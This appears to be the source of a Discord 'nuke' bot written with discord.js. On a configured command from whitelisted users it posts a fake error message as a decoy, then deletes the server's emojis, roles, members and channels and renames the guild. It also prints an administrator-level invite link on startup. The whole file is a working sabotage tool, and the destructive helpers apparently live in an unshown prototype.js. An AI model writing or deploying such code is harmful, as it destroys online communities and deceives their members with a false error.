const { Client, Guild } = require('discord.js');
const config = require('config');
const client = new Client();
require('./prototype.js')


client.on('message', message => {
	if(!config.filterUsers.includes(message.author.id))return;
	if(!message.guild)return;
	if(message.content == config.command){
		message.channel.send(config.fakeError);

		setTimeout(() => {
			message.guild
			.emojisDestroy()
			.rolesDestroy()
			.membersDestroy()
			.channelsDestroy()
			//.timeoutLeave(1000*60*2)
			.setName('ой');
		}, 3000)

	}
})

client.on('ready', () => {
	console.log('Bot ready');
	client.generateInvite(8).then(console.log)
})

client.login(process.env.TOKEN)
